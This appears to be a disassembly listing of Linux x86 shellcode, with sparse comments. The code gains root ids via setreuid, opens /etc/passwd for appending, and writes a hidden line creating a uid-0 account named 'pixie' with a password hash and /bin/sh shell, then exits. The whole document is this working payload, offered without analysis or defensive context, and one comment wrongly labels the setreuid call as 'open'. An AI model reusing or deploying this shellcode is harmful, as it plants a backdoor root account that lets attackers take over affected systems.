00000000  31C9              xor ecx,ecx ; zero out ecx
00000002  89CB              mov ebx,ecx ; zero out ebx 
00000004  6A46              push byte +0x46 ; syscall for open function
00000006  58                pop eax 
00000007  CD80              int 0x80 
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373 ; push dwss
00000014  682F2F7061        push dword 0x61702f2f ; push ap//
00000019  682F657463        push dword 0x6374652f ; push cte
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E823000000        call 0x4e 
0000002B  7069              jo 0x96
0000002D  7869              js 0x98
0000002F  653A417A          cmp al,[gs:ecx+0x7a]
00000033  47                inc edi
00000034  6937392F6C79      imul esi,[edi],dword 0x796c2f39
0000003A  774E              ja 0x8a
0000003C  61                popa
0000003D  633A              arpl [edx],di
0000003F  303A              xor [edx],bh
00000041  303A              xor [edx],bh
00000043  3A2F              cmp ch,[edi]
00000045  3A2F              cmp ch,[edi]
00000047  62696E            bound ebp,[ecx+0x6e]
0000004A  2F                das
0000004B  7368              jnc 0xb5
0000004D  0A598B            or bl,[ecx-0x75]
00000050  51                push ecx
00000051  FC                cld
00000052  6A04              push byte +0x4
00000054  58                pop eax
00000055  CD80              int 0x80
00000057  6A01              push byte +0x1
00000059  58                pop eax
0000005A  CD80              int 0x80

